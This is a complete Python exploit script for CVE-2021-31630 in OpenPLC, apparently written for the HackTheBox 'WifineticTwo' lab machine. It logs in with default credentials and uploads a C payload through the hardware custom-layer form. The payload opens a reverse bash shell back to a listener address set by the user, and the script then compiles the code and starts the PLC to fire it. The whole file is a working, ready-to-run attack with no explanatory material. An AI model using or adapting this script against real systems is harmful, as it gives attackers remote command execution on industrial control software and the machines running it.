#!/usr/bin/env python3
import requests
import argparse
import signal
import sys
import time


def parse_arguments():
    """
    Parses command-line arguments.
    """
    parser = argparse.ArgumentParser(description="Exploit CVE-2021-31630 PoC for OpenPLC on WifineticTwo box at HackTheBox. For educational purposes only.")
    parser.add_argument("--target", default="http://wifinetictwo.htb:8080", type=str, help="Target base address. E.g. http://wifinetictwo.htb:8080")
    parser.add_argument("--lhost", required=True, type=str, help="IP address to connect back to.")
    parser.add_argument("--lport", required=True, type=int, help="Port to connect back to.")
    parser.add_argument("--usr", type=str, default="openplc", help="Username for OpenPLC.")
    parser.add_argument("--pwd", type=str, default="openplc", help="Password for OpenPLC.")
    return parser.parse_args()


def signal_handler(sig, frame):
    """
    Handles SIGINT signal to allow graceful termination.
    """
    print("\n[!] Interrupt signal received. Exiting...")
    sys.exit(0)


def create_upload_request(local_ip, local_port):
    """
    Creates the multipart upload request with the payload.
    """
    payload_template = f"""\
-----------------------------3040215761330541470566170096
Content-Disposition: form-data; name="hardware_layer"

blank_linux
-----------------------------3040215761330541470566170096
Content-Disposition: form-data; name="custom_layer_code"

#include "ladder.h"
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int ignored_bool_inputs[] = {{-1}};
int ignored_bool_outputs[] = {{-1}};
int ignored_int_inputs[] = {{-1}};
int ignored_int_outputs[] = {{-1}};

void initCustomLayer()
{{
}}

void updateCustomIn()
{{

}}

void updateCustomOut()
{{
    int port = {local_port};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;           
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{local_ip}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {{"bash", NULL}};
    execvp("bash", argv);

    return 0;
}}

-----------------------------3040215761330541470566170096--
"""
    return payload_template


def login_and_exploit(base_url, username, password, upload_request):
    """
    Logs into the OpenPLC application and uploads the exploit.
    """
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "multipart/form-data; boundary=---------------------------3040215761330541470566170096",
        "Origin": f"{base_url}",
        "Connection": "close",
        "Referer": "http://wifinetictwo.htb:8080/hardware",
    }

    with requests.Session() as session:
        # Attempt to log in
        login_response = session.post(f"{base_url}/login", data={"username": username, "password": password})
        if not len(login_response.content) >= 34100:
            print("[-] Login failed, check username and password!")
            return

        # Upload exploit
        print("[+] Logged in successfully. Uploading exploit...")
        upload_response = session.post(f"{base_url}/hardware", headers=headers, data=upload_request.encode("utf-8"))
        if upload_response.ok:
            print("[+] Exploit uploaded successfully. Triggering exploit...")
            trigger_exploit(session, base_url)
        else:
            print("[-] Failed to upload exploit.")


def trigger_exploit(session, base_url):
    """
    Triggers the exploit by attempting to compile the uploaded payload.
    """
    start_compile = session.get(f"{base_url}/compile-program?file=blank_program.st")

    check_url = f"{base_url}/compilation-logs"
    while True:
        compile_check = session.get(check_url)
        if compile_check.status_code == 200:
            if len(compile_check.content) < 250:
                print("[+] Compilation in progress. Retrying in 5 seconds...")
                time.sleep(5)
            else:
                print("[+] Compilation successful. Activating...")
                time.sleep(3)
                session.get(f"{base_url}/start_plc")
                print('[~] Reverse shell should be active.')
                break
        else:
            print("[-] Compilation failed or unexpected response.")
            break


def main():
    signal.signal(signal.SIGINT, signal_handler)
    args = parse_arguments()

    upload_request = create_upload_request(args.lhost, args.lport)

    login_and_exploit(args.target, args.usr, args.pwd, upload_request)


if __name__ == "__main__":
    main()
